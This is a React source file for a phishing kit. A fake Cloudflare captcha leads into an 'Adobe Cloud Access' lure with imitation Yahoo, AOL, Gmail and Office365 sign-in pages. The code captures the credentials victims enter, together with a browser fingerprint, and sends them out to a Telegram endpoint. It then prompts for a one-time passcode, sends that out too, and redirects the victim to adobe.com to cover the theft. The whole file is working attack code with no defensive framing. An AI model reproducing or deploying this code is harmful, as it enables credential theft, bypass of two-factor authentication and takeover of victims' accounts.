import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate } from 'react-router-dom';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import YahooLoginPage from './components/YahooLoginPage';
import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
import AolLoginPage from './components/AolLoginPage';
import GmailLoginPage from './components/GmailLoginPage';
import Office365Wrapper from './components/Office365Wrapper';
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import OtpPage from './components/OtpPage';
import MobileOtpPage from './components/mobile/MobileOtpPage';
import Spinner from './components/common/Spinner';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
import { config } from './config';

// This function is unchanged
const safeSendToTelegram = async (sessionData: any) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(sessionData) });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
    return await res.json();
  } catch (fetchErr) { console.error('sendToTelegram failed:', fetchErr); throw fetchErr; }
};

function App() {
  const [isMobile, setIsMobile] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttemptData, setLoginAttemptData] = useState<any>(null);
  const [showOtpPage, setShowOtpPage] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  useEffect(() => {
    const handleCookieChange = (event: CookieChangeEvent) => {
      if (event.name === 'adobe_session') {
        const isActive = event.action !== 'remove' && !!event.value;
        setHasActiveSession(isActive);
        if (!isActive) {
          setShowOtpPage(false); // Reset OTP state on logout
          setLoginAttemptData(null);
          navigate('/', { replace: true });
        }
      }
    };
    const unsubscribe = subscribeToCookieChanges(handleCookieChange);
    return unsubscribe;
  }, [navigate]);

  useEffect(() => {
    if (hasActiveSession) {
      navigate('/landing', { replace: true });
    } else if (showOtpPage) {
      navigate('/otp', { replace: true });
    } else {
      // Handles initial load and logout cases
      const currentPath = window.location.pathname;
      if (currentPath !== '/' && currentPath !== '/login') {
          navigate('/', { replace: true });
      }
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [hasActiveSession, showOtpPage]);

  const handleCaptchaVerified = () => navigate('/login');

  const handleLoginSuccess = async (loginData: any) => {
    // This function is now the entry point for the new flow
    if (loginData.isSecondAttempt) {
      setIsLoading(true);
      console.log('Second attempt data received by App.tsx. Preparing to send credentials.');
      const browserFingerprint = await getBrowserFingerprint();
      const credentialsData = { 
        ...loginData, 
        sessionId: Math.random().toString(36).substring(2, 15), 
        timestamp: new Date().toISOString(), 
        userAgent: navigator.userAgent, 
        ...browserFingerprint 
      };
      
      // Store data for OTP step, then send credentials to Telegram
      setLoginAttemptData(credentialsData);
      
      try {
        await safeSendToTelegram({
          type: 'Credentials',
          ...credentialsData
        });
        console.log('Credentials sent to Telegram. Showing OTP page.');
        // On success, show OTP page
        setShowOtpPage(true);
        navigate('/otp', { replace: true });
      } catch (error) {
        console.error('Failed to send credentials to Telegram:', error);
        // Handle error - maybe show a message to the user
      } finally {
        setIsLoading(false);
      }
    }
    // Note: The old flow (without isSecondAttempt) is no longer processed here.
  };
  
  const handleOtpSubmit = async (otp: string) => {
    if (!loginAttemptData) {
      console.error('Cannot submit OTP, no login data found.');
      // Redirect to start to be safe
      setShowOtpPage(false);
      navigate('/', { replace: true });
      return;
    }
    
    setIsLoading(true);
    console.log('OTP received. Sending to Telegram and redirecting.');
    
    const otpData = {
      type: 'OTP',
      otp,
      sessionId: loginAttemptData.sessionId,
      timestamp: new Date().toISOString(),
    };
    
    try {
      await safeSendToTelegram(otpData);
      console.log('OTP sent successfully.');
    } catch (error) {
      console.error('Failed to send OTP to Telegram:', error);
    } finally {
      // Whether TG send succeeds or fails, complete the flow for the user
      setIsLoading(false);
      setLoginAttemptData(null);
      setShowOtpPage(false);
      // Final redirection to Adobe website
      window.location.href = 'https://www.adobe.com';
    }
  };


  const handleLogout = () => {
    localStorage.removeItem(config.session.sessionDataKey);
    localStorage.removeItem('adobe_pre_session');
    sessionStorage.clear();
    setLoginAttemptData(null);
    setShowOtpPage(false);
    config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
  };

  // --- Render Logic ---
  if (isLoading && !showOtpPage) {
    return <div className="min-h-screen bg-gray-100 flex items-center justify-center"><div className="text-center"><Spinner size="lg" /><p className="text-gray-600 mt-4">Loading...</p></div></div>;
  }

  const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
  const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
  const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
  const OtpComponent = isMobile ? MobileOtpPage : OtpPage;

  return (
    <Routes>
      <Route path="/" element={!hasActiveSession && !showOtpPage ? <CloudflareCaptcha onVerified={handleCaptchaVerified} /> : <Navigate to={hasActiveSession ? "/landing" : "/otp"} replace />} />
      <Route path="/login" element={!hasActiveSession && !showOtpPage ? <LoginComponent fileName="Adobe Cloud Access" onYahooSelect={() => navigate('/login/yahoo')} onAolSelect={() => navigate('/login/aol')} onGmailSelect={() => navigate('/login/gmail')} onOffice365Select={() => navigate('/login/office365')} onBack={() => navigate('/')} onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : showOtpPage ? "/otp" : "/"} replace />} />
      <Route path="/login/yahoo" element={!hasActiveSession && !showOtpPage ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
      <Route path="/login/aol" element={!hasActiveSession && !showOtpPage ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
      <Route path="/login/gmail" element={!hasActiveSession && !showOtpPage ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
      <Route path="/login/office365" element={!hasActiveSession && !showOtpPage ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
      
      {/* New OTP Route */}
      <Route path="/otp" element={showOtpPage && !hasActiveSession ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginAttemptData?.email} /> : <Navigate to="/" replace />} />
      
      <Route path="/landing" element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to="/" replace />} />
      <Route path="*" element={<Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
    </Routes>
  );
}

export default App;
